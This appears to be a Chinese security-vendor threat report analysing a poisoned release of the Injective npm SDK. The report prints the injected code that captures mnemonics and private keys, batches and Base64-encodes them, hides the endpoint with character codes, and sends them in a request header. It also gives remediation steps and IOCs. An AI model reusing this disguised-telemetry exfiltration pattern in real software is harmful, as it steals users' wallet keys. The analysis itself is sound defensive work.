---
title: 威胁情报 | Injective SDK 投毒，加密钱包私钥失窃
url: https://mp.weixin.qq.com/s/8vs_g26AOPWExkUuAzInCg
source: Doonsec's feed
date: 2026-07-11
fetch_date: 2026-07-12T05:10:45.977901
---

# 威胁情报 | Injective SDK 投毒，加密钱包私钥失窃

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/8z8bibAexaCIeBxd4DbUawWy0Hba5aK3uXTfDriaIHTcSicF3ib7ux7EyWFwgOsGpfcCwtC37gicbMxxkMsx431mzYwB3K7wh6sXBUfqy3LBIbE4/0?wx_fmt=jpeg)

# 威胁情报 | Injective SDK 投毒，加密钱包私钥失窃

白帽子

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于慢雾科技
，作者慢雾安全团队

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM4FqAumbguXteG2OtztBWwTZ6xLLfTaIQfRvzdJhLZkibQ/0)

**慢雾科技**
.

慢雾科技是一家专注区块链生态安全的公司，成立于 2018 年 1 月，主要通过“威胁发现到威胁防御一体化因地制宜的安全解决方案”服务了全球许多头部或知名的项目，已有商业客户上千家，客户分布在十几个主要国家与地区。

********# 背景******

************#

**这次调查的起点，是一个看似普通的开发流程：开发者安装 Injective 官方 SDK，生成钱包、导入助记词，或将已有私钥传入 SDK 接口。程序安装阶段一切正常，钱包操作也可能正常返回结果。但与此同时，程序后台却多出了一条不在正常业务逻辑中的网络请求。

近日，安全研究公司 Socket 在对 npm 生态的威胁狩猎中，发现 @injectivelabs/sdk-ts 1.20.21 版本存在异常行为。SlowMist MistEye 安全监控系统同样捕获了这一恶意供应链攻击事件。经分析确认，该样本不是攻击者重新制作的仿冒包，而是一个带有恶意代码的正版 SDK 构建产物。相关公开背景可参考《Compromised Injective SDK npm Package》[1]。

@injectivelabs/sdk-ts 正常用于查询链上数据、构造交易、签名以及导入或生成钱包密钥。其代码直接接触助记词和私钥，属于需要高度信任的软件组件。本地静态分析确认，恶意代码会在部分私钥派生接口被调用后，将助记词或字符串私钥推入队列，经 Base64 编码后放入 X-Request-Id 请求头，再以 HTTP POST 请求发出。**************

**# MistEye 响应

**MistEye 是由 SlowMist 自主研发的 Web3 威胁情报与动态安全监控系统，集成了安全监控与情报聚合能力，为用户提供实时的风险预警与资产守护。

在捕获本次 Injective 官方 SDK 遭供应链入侵事件后，MistEye 系统已触发告警并完成攻击链分析。报告覆盖了恶意代码注入点、数据编码与外传通道、目标地址、版本差异以及可提取的 IOC。相关情报可通过 MistEye API 和依赖扫描工具进一步排查。**

**![标题: fig:](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCJf5feAlEy0NIewyGHEiaDiaYWNdnvIWeAvOkg3V6ts0ldW2GtFyYkM7rtlzMyJNUjouKKVJpibsHqY1iakMrZIFRDHX7bwhZ3LliaQ/640?wx_fmt=png&from=appmsg)**

******# 以下按调查线索展开。**********

**********# 技术分析************线索一：安装阶段没有留下明显痕迹。

调查从 package.json 入手。约第 485-500 行未发现 postinstall、preinstall 等安装生命周期脚本。单纯安装该版本不会自动触发外传，因此仅检查安装日志可能发现不了异常。

但这不代表包是安全的。恶意代码被植入了 SDK 的密钥派生路径，触发条件不是安装，而是应用实际调用钱包接口。

线索二：正常的 SDK 外观掩盖了异常的参数。

样本的包名、README 和大部分构建代码保持正常外观。恶意区块位于 accounts 构建文件中，注释使用了 key-derivation-telemetry、anonymized usage metrics 和 SDK optimization 等字样，外观上像 SDK 自身的数据统计模块。

正常的遥测通常只记录方法名称或调用耗时。但这里的代码直接接收完整助记词或字符串私钥，未做任何匿名化、哈希或脱敏处理。这是第一处关键矛盾：注释声称在做统计，参数承载的却是钱包根密钥。

**线索三：哪些调用触发了密钥记录。

可以把触发路径分成三种情况：

1. PrivateKey.generate() 先生成助记词，再继续调用 fromMnemonic()。

2. PrivateKey.fromMnemonic(words) 把完整助记词交给 trackKeyDerivation()。

3. 字符串形式的 PrivateKey.fromHex(privateKey) 把完整私钥交给同一个记录函数。

fromPrivateKey() 本身没有调用 trackKeyDerivation()，因此不能笼统地说所有私钥接口都会触发外传。

关键代码位于 dist/esm/accounts-jQ1GSgaW.js 第 989-1006 行和第 1024-1028 行：

```
static generate() {   const mnemonic = generateMnemonic(wordlist);   return {      privateKey: PrivateKey.fromMnemonic(mnemonic),      mnemonic   }; }
 static fromMnemonic(words, path = DEFAULT_DERIVATION_PATH) {   trackKeyDerivation("fm", words);   return new PrivateKey(new Wallet(HDNodeWallet.fromPhrase(words, void 0, path).privateKey)); }
 static fromHex(privateKey) {   trackKeyDerivation("fh", typeof privateKey === "string" ? privateKey : "bytes");   const isString = typeof privateKey === "string";   const privateKeyHex = isString && privateKey.startsWith("0x")      ? privateKey.slice(2)      : privateKey;   return new PrivateKey(new Wallet(      uint8ArrayToHex(          isString ? hexToUint8Array(privateKeyHex.toString()) : privateKey      )   )); }
```

**字符串输入会被原样放入队列；字节数组输入只记录固定文字 bytes，不包含具体字节值。**

**证据判断：源码可以确认密钥材料进入了额外的记录函数，但无法确认请求是否实际到达目标，也无法确认数据是否已被读取。**

**线索四：数据并非立即外传。**

********记录函数把每条数据写成 方法:内容:时间戳。fm 表示助记词，fh 表示十六进制私钥。程序先把记录放入全局队列，等待约 2 秒；如果期间发生多次密钥派生，就用 | 连接成一批。

```
function _flush() {   if (_t) return;   _t = setTimeout(() => {      _t = null;      if (!_q.length) return;      _send(_enc(_q.join("|")));      _q = [];   }, 2e3); }
 function trackKeyDerivation(method, value) {   _q.push(`${method}:${value}:${Date.now()}`);   _flush(); }
```**

****文件：dist/esm/accounts-jQ1GSgaW.js 第 950-971 行。****

****随后，程序使用 Base64 编码。Base64 只是换一种字符表示方式，不是加密，接收方可以直接还原。等待和批量发送会减少请求次数，也会改变单条记录在网络中的形态，但不会改变数据的敏感性。****

******![标题: fig:](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCLR21icASP1bMfzOBxwibDGibTkVSiblF9h8xsH02YSPAQs8Td581d6BS1wBTYQXof2I5BmicQ22ICRZxf0cFVAJZhia0u0ATsibiaXFLA/640?wx_fmt=png&from=appmsg)******

**线索五：外传请求伪装成正常调用，但存在明显破绽。

发送函数优先使用 fetch，把数据放到 X-Request-Id 请求头，正文为空；如果 fetch 不可用且 \_\_require 可用，才回退到 Node.js 的 https.request。**

```
fetch(_ep, {   method: "POST",   headers: {      "Content-Type": "application/grpc-web+proto",      "X-Request-Id": d   },   ...typeof window !== "undefined" ? { keepalive: true } : {} }).catch(() => {});
```

**请求使用了 gRPC-Web 风格的 Content-Type，但源码中找不到合约地址、方法名、protobuf 交易体、签名数据或广播接口。它请求的是根路径 /，正文为空，密钥数据只出现在请求头中。换句话说，这不是一次正常的合约调用，而是以 HTTP 请求方式实施的数据外传。

浏览器分支的 keepalive 仅尝试在页面关闭时保持请求，不能保证完成。请求失败时，异常和异步错误被静默忽略，正常钱包操作仍会继续；服务端返回内容也没有被解析执行。**

**![标题: fig:](https://mmbiz.qpic.cn/mmbiz_png/8z8bibAexaCJbtarZ1nu1kctOSUnVy8ib442YwlNkBnI4GIoDHpaQ68OITzcNKulRwmOxCKffxllicxs4pVlloXULefxppMibmVuBZwUGHNiasO4/640?wx_fmt=png&from=appmsg)**

**需要留意的是，如果代理、防火墙、应用监控或调试日志记录了 X-Request-Id，其中可能保存着 Base64 编码的助记词或私钥。后续调查需确认日志平台、后端存储和服务账号的访问权限情况，但代码本身未提供任何服务端访问或日志读取能力。

线索六：目标地址在官方域名下，但无法确认数据接收者。

主机名没有明文写在代码中，而是被拆成数字数组，再通过 String.fromCharCode 还原：

```
const _d = () => _e.map((x) => String.fromCharCode(x)).join("");const _ep = "https://" + _d() + "/";
```

**静态解码得到：testnet[.]archival[.]chain[.]grpc-web[.]injective[.]network。******后续核查显示，该地址属于 Injective 官方域名体系和官方基础设施。当前报告记录其曾解析到 15[.]235[.]87[.]88；DNS 结果会随时间和查询位置变化，不能单独用来判断服务控制权。Injective 的公共端点文档[2]列出 testnet[.]sentry[.]chain[.]grpc-web[.]injective[.]network，归档节点文档

****[3]说明官方存在归档网关概念，但公开列表没有单独列出 archival 主机。****************

******在不携带实际数据的探测中，对该目标发起普通 GET 请求返回 501 Not Implemented；以空内容的 gRPC-Web 风格 POST 请求访问，返回 grpc-status: 12 和 malformed method name: "/"，与官方 Testnet gRPC-Web 端点的默认响应一致。这说明目标当前运行着类似的网关服务，但不能说明密钥已被服务端保存。******

******数据要真正被获取，需要同时满足两个条件：网关或日志系统记录了请求头，且攻击者拥有这些日志或后端存储的读取权限。目前没有证据表明官方服务器或日志系统已被攻击者控制。******

******![标题: fig:](https://mmbiz.qpic.cn/mmbiz_png/8z8bibAexaCIMGcHKRicrSFCe6mqjNkREvFDXlOU2d5GRm3FnCd8XlBJVpYcwiaxhve0zluZktAEXfTPmGianqJloUQiaqpDiba3Br4tlhibebXnfY/640?wx_fmt=png&from=appmsg)******

******# 总结****这条调查链最终回答了四个问题：

1. 什么时候触发：调用 generate()、fromMnemonic() 或字符串形式的 fromHex() 时。

2. 发送了什么：完整助记词，或字符串形式的私钥；字节数组只记录 bytes。

3. 怎么发送：等待约 2 秒，使用 Base64 编码后放进空 POST 请求的 X-Request-Id 请求头。

4. 能确认到什么程度：源码确认了外传请求的构造逻辑和官方目标地址，但无法确认密钥是否已被服务端保存、记录、转发或提交到链上。

对使用者而言，最紧迫的问题不是确认服务器由谁控制，而是确认密钥是否经过受影响的接口。如果使用过该版本派生或导入钱包，应按密钥可能泄露进行处置。

建议:

1. 检查依赖树、依赖锁定文件、缓存、容器镜像和已构建前端资产，确认没有继续使用 @injectivelabs/sdk-ts@1.20.21。

2. 升级到维护者确认并由组织自行验证的安全版本；不要只删除缓存后继续使用原有钱包密钥。

3. 盘点所有通过该 SDK 派生或导入的助记词、私钥和测试密钥。对高价值钱包生成新密钥并转移资产，同时撤销旧地址的授权、合约角色和自动签名权限。

4. 在 DNS、代理和出口日志中检索 testnet[.]archival[.]chain[.]grpc-web[.]injective[.]network，先保留相关日志并进行监控；确认存在异常请求后，再按组织策略限制异常流量。

5. 检查浏览器、Node.js、持续集成与持续交付（CI/CD）、代理和防火墙日志，重点关注带有 X-Request-Id、application/grpc-web+proto 且正文为空的 POST 请求。含有这类请求头的日志应限制访问，避免复制到普通工单或聊天记录。

6. 使用软件物料清单（SBOM）、lockfile、node\_modules、制品仓库和镜像扫描直接依赖与传递依赖，确认 1.20.21 没有继续进入构建环境。

7. 维护者应审计 npm 发布账号、GitHub Actions、npm 可信发布和身份令牌配置、构建机及发布流程；若需确认 GitHub 账号入侵、发布时间、下载量或依赖传播，应使用发布平台记录和组织审计日志独立核实。********# IOC**

********#

恶意依赖

@injectivelabs/sdk-ts@1.20.21

受影响依赖包（均间接依赖 @injectivelabs/sdk-ts@1.20.21）

**@injectivelabs/utils@1.20.21**

**@injectivelabs/networks@1.20.21**

**@injectivelabs/ts-types@1.20.21
@injectivelabs/exceptions@1.20.21
@injectivelabs/wallet-base@1.20.21
@injectivelabs/wallet-core@1.20.21**

**@injectivelabs/wallet-cosmos@1.20.21
@injectivelabs/wallet-private-key@1.20.21
@injectivelabs/wallet-evm@1.20.21**

**@injectivelabs/wallet-trezor@1.20.21
@injectivelabs/wallet-cosmostation@1.20.21
@injectivelabs/wallet-ledger@1.20.21
@injectivelabs/wallet-wallet-connect@1.20.21
@injectivelabs/wallet-magic@1.20.21**

****@injectivelabs/wallet-strategy@1.20.21****

**@injectivelabs/wallet-turnkey@1.20.21**

**@injectivelabs/wallet-cosmos-strategy@1.20.21**

恶意文件

**filename: injectivelabs\_\_sdk-ts-1.20.21-socket-raw-reconstructed.tar.gz
MD5: d72bdb86962a4bb673619945175f6378
SHA1: 9233c753a5a4b0f89d1ae0f4ecf6a74fd8d9eff1
SHA256: 624ac118eb5e66d6d313424d375021298bf8a809925a7c642300a41fd672a05d**

**filename: dist/cjs/accounts-Cy0p4lLW.cjs**

**MD5: 9b37a86aad8a5e191c1b8c33978485...